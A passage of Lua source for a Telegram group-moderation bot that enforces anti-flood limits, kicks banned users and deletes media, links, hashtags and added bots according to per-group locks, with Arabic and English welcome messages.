    local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
    if not database:get(pm) then
      msgs = 0
    else
      msgs = tonumber(database:get(pm))
    end
    -----------------End-------------------
    ------------Flood Check Time-----------
    local TIME_CHECK = 2
    -----------------End-------------------
    -------------Flood Check---------------faeder
    local hashflood = 'anti-flood:'..msg.chat_id_
    if msgs > (floodMax - 1) then
      if database:get('floodstatus'..msg.chat_id_) == 'Kicked' then
        del_all_msgs(msg.chat_id_, msg.sender_user_id_)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
      elseif database:get('floodstatus'..msg.chat_id_) == 'DelMsg' then
        del_all_msgs(msg.chat_id_, msg.sender_user_id_)
      else
        del_all_msgs(msg.chat_id_, msg.sender_user_id_)
      end
    end
    -----------------End-------------------
local sendfaeder = function(chat_id, reply_to_message_id, text, offset, length, userid)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = {
      ID = "InputMessageText",
      text_ = text,
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {
        [0] = {
          ID = "MessageEntityMentionName",
          offset_ = offset,
          length_ = length,
          user_id_ = userid
        }
      }
    }
  }, dl_cb, nil)
end
    --------------ANTI ATTACK-------------faeder
    local pmonpv = 'antiattack:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
    if not database:get(pmonpv) then
      msgsonpv = 0
    else
      msgsonpv = tonumber(database:get(pmonpv))
    end
    if msgsonpv > (13 - 1) then
      blockUser(msg.sender_user_id_)
    end
    local idmem = tostring(msg.chat_id_)
    if idmem:match("^(%d+)") then
      database:setex(pmonpv, TIME_CHECK, msgsonpv+1)
    end
    ----------

    
    -------------------------------------- Process mod --------------------------------------------
    -----------------------------------------------------------------------------------------------

    -------------------------------------------------------------------------------------------------------
    -------------------------------------------------------------------------------------------------------
    -----------------------------******** START MSG CHECKS FAEDER ********----------------------------------------
    -------------------------------------------------------------------------------------------------------
    -----------------------------------faeder--------------------------------------------------------------------
    if is_banned(msg.sender_user_id_, msg.chat_id_) then
      local id = msg.id_
      local msgs = {[0] = id}
      local chat = msg.chat_id_
      chat_kick(msg.chat_id_, msg.sender_user_id_)
      return
    end
    if is_muted(msg.sender_user_id_, msg.chat_id_) then
      local id = msg.id_
      local msgs = {[0] = id}
      local chat = msg.chat_id_
      delete_msg(chat,msgs)
      return
    end
    if is_gbanned(msg.sender_user_id_) then
      local id = msg.id_
      local msgs = {[0] = id}
      local chat = msg.chat_id_
      chat_kick(msg.chat_id_, msg.sender_user_id_)
      delete_msg(chat,msgs)
      return
    end
    if database:get('bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
      local id = msg.id_
      local msgs = {[0] = id}
      local chat = msg.chat_id_
      delete_msg(chat,msgs)
      return
    end
    database:incr('user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
    database:incr('group:msgs'..msg.chat_id_)
    if msg.content_.ID == "MessagePinMessage" then
      if database:get('pinnedmsg'..msg.chat_id_) and database:get('bot:pin:mute'..msg.chat_id_) then
        unpinmsg(msg.chat_id_)
        local pin_id = database:get('pinnedmsg'..msg.chat_id_)
        pinmsg(msg.chat_id_,pin_id,0)
      end
    end
    if database:get('bot:viewget'..msg.sender_user_id_) then
      if not msg.forward_info_ then
        if database:get('lang:gp:'..msg.chat_id_) then
        end
        database:del('bot:viewget'..msg.sender_user_id_)
      else
        if database:get('lang:gp:'..msg.chat_id_) then
          faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ The more hits you : '..msg.views_..' seen •', 1, 'md')
        else
          faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ مشاهدات المنشور • '..msg.views_..' تقريبا •', 1, 'md')
        end
        database:del('bot:viewget'..msg.sender_user_id_)
      end
    end
    --Photo
    --Photo
    ------- --- Photo--------- faeder
    -- -----------------Photo
    --Photo
    --Photo
    
    if msg_type == 'MSG:Photo' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Photo]")
            end
          end
        end
        if database:get('bot:photo:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Photo]")
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Photo]")
              if database:get('bot:strict'..msg.chat_id_) then
                chat_kick(msg.chat_id_, msg.sender_user_id_)
              end
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Photo]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Photo]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Photo]")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Photo]")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Photo]")
            end
          end
        end
      end

      --Markdown
      --Markdown
      ------- --- Markdown---------faedee
      -- -----------------Markdown
      --Markdown
      --Markdown
    elseif msg_type == 'MSG:MarkDown' then
      if database:get('markdown:lock'..msg.chat_id_) then
        if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
        end
      end
      --Document
      --Document
      ------- --- Document--------- faeder
      -- -----------------Document
      --Document
      --Document
    elseif msg_type == 'MSG:Document' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Document]")
            end
          end
        end
        if database:get('bot:document:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Document]")
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Document]")
              if database:get('bot:strict'..msg.chat_id_) then
                chat_kick(msg.chat_id_, msg.sender_user_id_)
              end
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Document]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Document]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Document]")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Document]")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Document]")
            end
          end
        end
      end
      --Inline
      --Inline
      ------- --- Inline---------faeder
      -- -----------------Inline
      --Inline
      --Inline
    elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if database:get('bot:inline:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Inline]")
        end
      end
      --Sticker
      --Sticker
      ------- --- Sticker---------faeder
      -- -----------------Sticker
      --Sticker
      --Sticker
    elseif msg_type == 'MSG:Sticker' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if database:get('bot:sticker:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Sticker]")
        end
      end
    elseif msg_type == 'MSG:JoinByLink' then
      if database:get('bot:tgservice:mute'..msg.chat_id_) then
        local id = msg.id_
        local msgs = {[0] = id}
        local chat = msg.chat_id_
        delete_msg(chat,msgs)
        print("Deleted [Lock] [Tgservice] [JoinByLink]")
        return
      end
      function get_welcome(extra,result,success)
        if database:get('welcome:'..msg.chat_id_) then
          text = database:get('welcome:'..msg.chat_id_)
        else
          if database:get('lang:gp:'..msg.chat_id_) then
            text = 'Hi {firstname} Welcome To Group 🌹'
          else
            text = '📱⁞ اهلا بك عزيزي •  {firstname}\n📚⁞ معرفك @{username} •\n🥀⁞ التزم بالقوانين لتجنب الطرد •'
          end
        end
        local text = text:gsub('{firstname}',(result.first_name_ or ''))
        local text = text:gsub('{lastname}',(result.last_name_ or ''))
        local text = text:gsub('{username}',(result.username_ or ''))
        faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
      end
      if database:get("bot:welcome"..msg.chat_id_) then
        getUser(msg.sender_user_id_,get_welcome)
      end
      --New User Add
      --New User Add
      ------- --- New User Add---------faeder
      -- -----------------New User Add
      --New User Add
      --New User Add
    elseif msg_type == 'MSG:NewUserAdd' then
      if database:get('bot:tgservice:mute'..msg.chat_id_) then
        local id = msg.id_
        local msgs = {[0] = id}
        local chat = msg.chat_id_
        delete_msg(chat,msgs)
        print("Deleted [Lock] [Tgservice] [NewUserAdd]")
        return
      end
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local list = msg.content_.members_
 for i = 0, #list do
if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and database:get("bot:bots:mute" .. msg.chat_id_) then
chat_kick(msg.chat_id_, list[i].id_)
end
if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and database:get("bot:bots:ban" .. msg.chat_id_) then
chat_kick(msg.chat_id_, list[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ممنوع اضافه البوتات •\n📚⁞ تم طرد البوت مع العضو •", 1, "md")
end
if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and database:get("keed_bots"..msg.chat_id_) then
chat_kick(msg.chat_id_, list[i].id_)
database:sadd('bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
database:sadd('bot:keed:'..msg.chat_id_, msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ممنوع اضافه البوتات •\n📚⁞ تم طرد البوت وتقييد العضو •", 1, "md")
end
end
end
      if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
        if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
          if database:get('bot:bots:gkgk'..msg.chat_id_) then
            chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
            return false
          end
        end
      end
      if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
        chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
        return false
      end
      if database:get("bot:welcome"..msg.chat_id_) then
        if database:get('welcome:'..msg.chat_id_) then
          text = database:get('welcome:'..msg.chat_id_)
        else
          if database:get('lang:gp:'..msg.chat_id_) then
            text = 'Hi Welcome To Group'
          else
            text = '🚦⁞ اهلا بك عزيزي •  {firstname}\n📚⁞ معرفك @{username} •\n🥀⁞ التزم بالقوانين لتجنب الطرد •'
          end
        end
        local text = text:gsub('{firstname}',(msg.content_.members_[0].first_name_ or ''))
        local text = text:gsub('{lastname}',(msg.content_.members_[0].last_name_ or ''))
        local text = text:gsub('{username}',('@'..msg.content_.members_[0].username_ or ''))
        faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
      end
      --Contact
      --Contact
      ------- --- Contact---------faeder
      -- -----------------Contact
      --Contact
      --Contact
    elseif msg_type == 'MSG:Contact' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Contact]")
            end
          end
        end
        if database:get('bot:contact:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Contact]")
        end
      end
      --Audio
      --Audio
      ------- --- Audio---------faeder
      -- -----------------Audio
      --Audio
      --Audio
    elseif msg_type == 'MSG:Audio' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Audio]")
            end
          end
        end
        if database:get('bot:music:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Audio]")
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Audio]")
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Audio]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Audio]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Audio]")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Audio]")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Audio]")
            end
          end
        end
      end
      --Voice
      --Voice
      ------- --- Voice---------faedee
      -- -----------------Voice
      --Voice
      --Voice
    elseif msg_type == 'MSG:Voice' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Voice]")
            end
          end
        end
        if database:get('bot:voice:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Voice]")
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Voice]")
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Voice]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Voice]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Voice]")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Voice]")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Voice]")
            end
          end
        end
      end
      --Location
      --Location
      ------- --- Location---------faeder
      -- -----------------Location
      --Location
      --Location
    elseif msg_type == 'MSG:Location' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Location]")
            end
          end
        end
        if database:get('bot:location:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Location]")
          return
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Location]")
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Location]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Location]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Location]")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Location]")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Location]")
            end
          end
        end
      end
      --Video
      --Video
      ------- --- Video---------faeder
      -- -----------------Video
      --Video
      --Video
    elseif msg_type == 'MSG:Video' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Video]")
            end
          end
        end
        if database:get('bot:video:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Video]")
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Video]")
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Video]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Video]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Video] ")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
